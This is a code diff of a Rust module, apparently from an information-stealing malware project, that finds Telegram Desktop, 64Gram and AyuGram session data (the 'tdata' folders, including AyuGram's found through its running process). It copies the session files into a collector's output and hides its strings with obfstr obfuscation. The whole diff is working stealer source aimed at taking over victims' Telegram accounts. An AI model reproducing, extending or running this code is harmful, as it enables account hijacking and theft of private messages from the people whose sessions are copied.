@@ -1,54 +1,103 @@
 use alloc::borrow::ToOwned;
-use alloc::vec;
+use alloc::sync::Arc;
+use alloc::{format, vec};
 use collector::{Collector, Software};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
 use obfstr::obfstr as s;
 use tasks::Task;
-use utils::path::Path;
+use utils::process::{get_process_list, get_process_path_by_pid, ProcessInfo};
 
 pub(super) struct TelegramTask;
 
-impl<C: Collector> Task<C> for TelegramTask {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+macro_rules! find_first_process {
+    (
+        $client_name:expr,
+        $processes:expr => $($process_name:expr),+ $(,)? => $extend:expr
+    ) => {
+        #[allow(unused_assignments)]
+        {
+            let mut found = false;
+            $(
+                if !found {
+                    if let Some(path) = find_process_path(obfstr::obfstr!($process_name), $processes)
+                        && let Some(path) = path.parent()
+                    {
+                        $extend.extend([(obfstr::obfstr!($client_name).to_owned(), path / "tdata")]);
+                        found = true;
+                    }
+                }
+            )+
+        }
+    };
+}
+
+impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let appdata = &Path::appdata();
-        let paths = [
-            (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
-            (s!("64Gram Desktop").to_owned(), appdata / s!("64Gram Desktop") / s!("tdata")),
+        let mut paths = vec![
+            (
+                s!("Telegram Desktop").to_owned(),
+                appdata / s!("Telegram Desktop") / s!("tdata"),
+            ),
+            (
+                s!("64Gram Desktop").to_owned(),
+                appdata / s!("64Gram Desktop") / s!("tdata"),
+            ),
         ];
-        
+
+        let processes = &get_process_list();
+
+        find_first_process!("AyuGram", processes => "AyuGram.exe" => paths);
+
         for (client, tdata_path) in paths {
-            if tdata_path.is_exists() {
+            if StorageFileSystem.is_exists(&tdata_path) {
                 let dst = parent / client;
-                copy_tdata(&tdata_path, &dst, collector);
+                copy_tdata(&tdata_path, filesystem, &dst, collector);
             }
         }
     }
 }
 
-fn copy_tdata<C>(tdata: &Path, dst: &Path, collector: &C)
+fn find_process_path(process_name: &str, processes: &[ProcessInfo]) -> Option<Path> {
+    let pid = processes
+        .iter()
+        .find(|process| process.name == Arc::from(process_name))?
+        .pid;
+
+    get_process_path_by_pid(pid)
+}
+
+fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
 where
-    C: Collector
+    C: Collector,
+    F: FileSystem,
 {
-    if !(tdata / s!("key_datas")).is_exists() {
-        return
+    if !StorageFileSystem.is_exists(tdata / s!("key_datas")) {
+        return;
     }
-    
+
     let mut contents = vec![];
     let mut files = vec![];
     let mut dirs = vec![];
-    
-    if let Some(list_files) = tdata.list_files() {
+
+    if let Some(list_files) = StorageFileSystem.list_files(tdata) {
         for path in list_files {
-            if path.is_file() {
+            if StorageFileSystem.is_file(&path) {
                 files.push(path);
-            } else if path.is_dir() {
+            } else if StorageFileSystem.is_dir(&path) {
                 dirs.push(path);
             }
         }
     }
-    
+
     for file in &files {
         for dir in &dirs {
-            if dir.name().unwrap().to_owned() + "s" == file.name().unwrap() {
+            if let Some(dir_name) = dir.name()
+                && let Some(file_name) = file.name()
+                && format!("{dir_name}s") == file_name
+            {
                 contents.push(file);
                 contents.push(dir);
             }
@@ -58,12 +107,12 @@ where
     if !contents.is_empty() {
         collector.get_software().set_telegram();
     }
-    
+
     for path in contents {
-        if path.is_file() {
-            let _ = path.copy_file(dst, true);
-        } else if path.is_dir() {
-            let _ = path.copy_folder(dst);
+        if StorageFileSystem.is_file(path) {
+            let _ = copy_file(StorageFileSystem, path, dst_filesystem, dst, true);
+        } else if StorageFileSystem.is_dir(path) {
+            let _ = copy_folder(StorageFileSystem, path, dst_filesystem, dst);
         }
     }
 }
